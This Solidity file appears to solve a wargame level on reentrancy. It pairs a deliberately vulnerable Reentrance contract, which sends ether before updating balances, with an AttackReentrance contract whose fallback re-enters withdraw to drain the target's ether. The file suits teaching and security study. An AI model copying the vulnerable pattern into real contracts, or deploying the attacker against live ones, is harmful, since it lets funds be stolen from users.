// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

import "https://github.com/OpenZeppelin/openzeppelin-contracts/blob/v3.2.0/contracts/math/SafeMath.sol";

contract Reentrance {
    using SafeMath for uint256;
    mapping(address => uint256) public balances;

    function donate(address _to) public payable {
        balances[_to] = balances[_to].add(msg.value);
    }

    function balanceOf(address _who) public view returns (uint256 balance) {
        return balances[_who];
    }

    function withdraw(uint256 _amount) public {
        if (balances[msg.sender] >= _amount) {
            // **VULNERABLE PORTION**
            // msg.call.value(_amount)("") triggers the fallback function of the attacker's contract
            // where the attack is able to make use the fallback function to withdraw more ether before the
            // check of balances[msg.sender] is completed
            (bool result, ) = msg.sender.call.value(_amount)("");
            if (result) {
                _amount;
            }
            balances[msg.sender] -= _amount;
        }
    }

    receive() external payable {}
}

contract AttackReentrance {
    Reentrance reentrance;
    address public owner;
    uint256 withdrawAmount = 1000000000000000;

    constructor(Reentrance _reentrance) public payable {
        reentrance = _reentrance;
        owner = msg.sender;
    }

    function balance() public view returns (uint256) {
        return address(this).balance;
    }

    function attack() public payable{
        require(msg.value >= withdrawAmount);
        reentrance.donate.value(msg.value)(address(this));
        reentrance.withdraw(msg.value);
    }

    fallback() external payable {
        uint256 targetBalance = address(reentrance).balance;
        if (targetBalance >= withdrawAmount) {
            reentrance.withdraw(withdrawAmount);
        }
    }
}
